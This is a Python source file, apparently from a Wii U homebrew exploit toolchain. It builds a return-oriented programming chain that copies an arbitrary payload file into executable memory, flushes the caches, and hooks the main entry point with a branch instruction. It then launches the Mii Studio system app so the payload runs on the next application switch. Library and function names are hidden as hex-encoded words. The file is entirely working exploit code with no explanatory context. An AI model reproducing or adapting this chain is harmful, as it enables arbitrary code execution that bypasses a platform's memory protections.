from ropgadgets import *
from common_defines import *
import struct


def load_code_bin_ropchain_calls(target_addr, extra_data_addr, rpl_name_addr, function_name_addr, payload_data_addr, payload_len):
    cur_chain = []
    # We are on a new thread on Core 1
    # We expected a memory mapping 0xA0000000 -> 0x1000000.
    # Copy our payload to the target_addr
    cur_chain += memcpy(0xC1000000 + target_addr, payload_data_addr, payload_len)
    cur_chain += DCFlushRange(target_addr, payload_len)
    cur_chain += ICInvalidateRange(target_addr, payload_len)

    # Create a main hook to execute the payload on the next application switch.
    cur_chain += memcpy(0xC1000000 + ADDRESS_main_entry_hook, extra_data_addr, 4)
    cur_chain += DCFlushRange(ADDRESS_main_entry_hook, 4)
    cur_chain += ICInvalidateRange(ADDRESS_main_entry_hook, 4)

    # Call _SYSLaunchMiiStudio() and exit the thread
    cur_chain += FindExportAndCall(extra_data_addr + 0x04, rpl_name_addr, function_name_addr)  # _SYSLaunchMiiStudio
    cur_chain += OSExitThread(0)

    return cur_chain


def load_code_bin_ropchain_data(base, path, entrypoint_addr):
    cur_chain = []

    extra_data_addr = base
    tmp_chain = [(entrypoint_addr & 0x03fffffc) | 0x48000003,  # branch to target_addr
                 0,
                 0]

    cur_chain += tmp_chain
    rpl_name_addr = extra_data_addr + (len(tmp_chain) * 4)
    tmp_chain = [0x73797361,
                 0x70702E72,
                 0x706C0000]

    cur_chain += tmp_chain
    function_name_addr = rpl_name_addr + (len(tmp_chain) * 4)
    tmp_chain = [0x5F535953,
                 0x4C61756E,
                 0x63684D69,
                 0x69537475,
                 0x64696F00]

    # Copy the target payload into the ROP.
    cur_chain += tmp_chain
    payload_data_addr = function_name_addr + (len(tmp_chain) * 4)

    tmp_chain = []
    payload_len = 0
    word = 1
    with open(path, "rb") as f:
        while word:

            word = f.read(4)
            if len(word) == 0:
                break
            val = 0
            if len(word) < 4:
                for x in range(len(word)):
                    val |= word[x] << ((3 - x) * 8)
            else:
                val = struct.unpack(">I", word)[0]
            tmp_chain.append(val)
            payload_len += 4

    cur_chain += tmp_chain
    return [cur_chain, extra_data_addr, rpl_name_addr, function_name_addr, payload_data_addr, payload_len]


def load_code_bin_ropchain(path, target_addr, entrypoint_addr):
    cur_chain = []
    base = 0x4D900000 + 0x14
    # Get the length of the "function calls" to calculates offsets
    rop_len = len(load_code_bin_ropchain_calls(0, 0, 0, 0, 0, 0)) * 4

    # Create the data for the payload
    tmp_data = load_code_bin_ropchain_data(base + rop_len, path, entrypoint_addr)

    # Build real ropchain
    cur_chain += load_code_bin_ropchain_calls(target_addr, tmp_data[1], tmp_data[2], tmp_data[3], tmp_data[4], tmp_data[5])
    cur_chain += tmp_data[0]
    return cur_chain
